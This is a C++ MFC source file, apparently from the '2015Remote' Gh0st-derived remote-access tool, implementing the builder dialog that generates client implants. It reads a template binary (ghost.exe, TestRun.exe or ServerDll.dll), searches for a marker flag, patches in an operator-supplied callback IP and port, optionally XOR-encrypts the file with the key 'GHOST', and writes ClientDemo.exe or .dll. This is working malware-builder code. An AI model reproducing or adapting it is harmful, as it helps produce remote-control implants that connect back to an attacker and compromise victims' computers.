// BuildDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include <io.h>

// CBuildDlg 对话框

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);

CBuildDlg::CBuildDlg(CWnd* pParent)
	: CDialog(CBuildDlg::IDD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuildDlg 消息处理程序


void CBuildDlg::OnBnClickedOk()
{
	CFile File;
	char szTemp[MAX_PATH];
	ZeroMemory(szTemp,MAX_PATH);
	CString strCurrentPath;
	CString strFile;
	CString strSeverFile;
	BYTE *  szBuffer=NULL;
	DWORD dwFileSize;
	UpdateData(TRUE);
	int index = m_ComboExe.GetCurSel();
	CString file;
	switch (index)
	{
	case CLIENT_TYPE_DLL:
		file = "TestRun.exe";
		break;
	case CLIENT_TYPE_ONE:
		file = "ghost.exe";
		break;
	case CLIENT_TYPE_MODULE:
		file = "ServerDll.dll";
		break;
	default:
		break;
	}
	if (file.IsEmpty())
	{
		MessageBox("无效输入参数, 请重新生成服务!");
		return CDialog::OnOK();
	}
	unsigned long flag = index == 0 ? FLAG_FINDEN : FLAG_GHOST;
	//////////上线信息//////////////////////
	CONNECT_ADDRESS g_ConnectAddress = { flag, "", 0, index };
	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));

	if (!g_ConnectAddress.IsValid())
		return;
	try
	{
		//此处得到未处理前的文件名
		char path[_MAX_PATH], *p = path;
		GetModuleFileNameA(NULL, path, sizeof(path));
		while (*p) ++p;
		while ('\\' != *p) --p;
		strcpy(p+1, file.GetString());

		strFile = path; //得到当前未处理文件名
		if (_access(path, 0) == -1)
		{
			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"不存在!");
			return CDialog::OnOK();
		}
		
		//打开文件
		File.Open(strFile,CFile::modeRead|CFile::typeBinary);
		
		dwFileSize=File.GetLength();
		szBuffer=new BYTE[dwFileSize];
		ZeroMemory(szBuffer,dwFileSize);
		//读取文件内容
		
		File.Read(szBuffer,dwFileSize);
		File.Close();
		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置
		int iOffset = MemoryFind((char*)szBuffer,(char*)&g_ConnectAddress.Flag(),dwFileSize,sizeof(DWORD));
		if (iOffset==-1)
		{
			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"不支持!");
			return;
		}
		if (MemoryFind((char*)szBuffer + iOffset + sizeof(sizeof(g_ConnectAddress)), (char*)&g_ConnectAddress.Flag(),
			dwFileSize - iOffset - sizeof(sizeof(g_ConnectAddress)), sizeof(DWORD)) != -1) {
			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"有问题!");
			return;
		}
		memcpy(szBuffer+iOffset,&g_ConnectAddress,sizeof(g_ConnectAddress));
		//保存到文件
		if (index == CLIENT_TYPE_MODULE)
		{
			strcpy(p + 1, "ClientDemo.dll");
		}
		else {
			strcpy(p + 1, "ClientDemo.exe");
		}
		strSeverFile = path;
		DeleteFileA(path);
		BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
		if (!r) {
			MessageBox(strSeverFile + "\r\n服务程序\"" + strSeverFile + "\"创建失败!");
			return CDialog::OnOK();
		}
		Encrypt(szBuffer, dwFileSize, m_ComboEncrypt.GetCurSel());
		File.Write(szBuffer, dwFileSize);
		File.Close();
		delete[] szBuffer;
		MessageBox("生成成功!文件位于:\r\n"+ strSeverFile);
	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足!");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误!");
	}
	catch (CException* e)
	{
		MessageBox("未知错误!");
	}
	CDialog::OnOK();
}

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize)   
{   
	int i,j;   
	if (iKeySize == 0||iBufferSize==0)
	{
		return -1;
	}
	for (i = 0; i < iBufferSize; ++i)   
	{   
		for (j = 0; j < iKeySize; j ++)   
			if (szBuffer[i+j] != Key[j])	break;
		if (j == iKeySize) return i;   
	}   
	return -1;   
}


BOOL CBuildDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	m_ComboExe.InsertString(CLIENT_TYPE_DLL, "TestRun.exe");
	m_ComboExe.InsertString(CLIENT_TYPE_ONE, "ghost.exe");
	m_ComboExe.InsertString(CLIENT_TYPE_MODULE, "ServerDll.dll");
	m_ComboExe.SetCurSel(0);

	m_ComboEncrypt.InsertString(0, "无");
	m_ComboEncrypt.InsertString(1, "XOR");
	m_ComboEncrypt.SetCurSel(0);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

Buffer CBuildDlg::Encrypt(BYTE* buffer, int len, int method) {
	switch (method)
	{
	case 0:// 不加密
		break;
	case 1: // XOR
		xor_encrypt_decrypt(buffer, len, { 'G', 'H', 'O', 'S', 'T' });
		break;
	default:
		break;
	}
	return Buffer();
}
